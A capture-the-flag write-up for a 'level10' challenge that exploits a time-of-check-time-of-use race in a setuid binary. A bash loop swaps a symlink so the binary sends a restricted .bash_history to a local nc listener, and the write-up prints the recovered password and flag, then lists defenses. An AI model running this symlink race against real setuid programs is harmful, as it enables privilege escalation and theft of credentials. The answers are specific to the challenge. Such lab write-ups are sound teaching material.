# Level 10 Solution: TOCTOU Race Condition

## Vulnerability
The `level10` binary has a **Time-of-Check-Time-of-Use (TOCTOU)** vulnerability. The binary:
1. Calls `access()` to check if the current user has read permission on a file
2. Then calls `open()` and `read()` to send the file over the network

This creates a race condition window between the two syscalls.

## Exploit Strategy
By rapidly switching a symlink target between the check and use, we can:
1. Pass the `access()` check with a readable file (or even a readable symlink)
2. Switch the symlink to point to a restricted file before `open()` is called
3. Since `level10` is setuid flag10, it can read files that flag10 can read
4. Read files like `/home/user/level10/.bash_history` to find the flag10 password

## Attack Steps

1. Create a dummy file and symlink:
```bash
echo "dummy" > dummy_file
ln -s dummy_file link
```

2. Set up a network listener to capture the file contents:
```bash
nc -l 6969 > captured_file &
```

3. Run the level10 binary in a loop, switching the symlink target to the desired file:
```bash
for attempt in {1..5000}; do
    ln -sf dummy_file link
    /home/user/level10/level10 link 127.0.0.1 >/dev/null 2>&1 &
    PID=$!

    # Rapidly switch symlink to target file
    for i in {1..500}; do
        ln -sf /home/user/level10/.bash_history link 2>/dev/null
    done

    wait $PID 2>/dev/null
done
```

4. Examine the captured data - it will contain the bash history of level10 user, which includes the password for flag10

## Key Finding
By reading `/home/user/level10/.bash_history` via the TOCTOU exploit, we discover the password:
```
woupa2yuojeeaaed06riuj63c
```

5. Login as flag10 with this password and run getflag:
```bash
su flag10
Password: woupa2yuojeeaaed06riuj63c
getflag
```

## Result
Flag: `feulo4b72j7edeahuete3no7c`

## Defense
- Use `open()` with O_NOFOLLOW flag to prevent symlink following
- Use `fstat()` instead of `access()` on the already-open file descriptor
- Avoid separate access checks; rely on open() to handle permissions
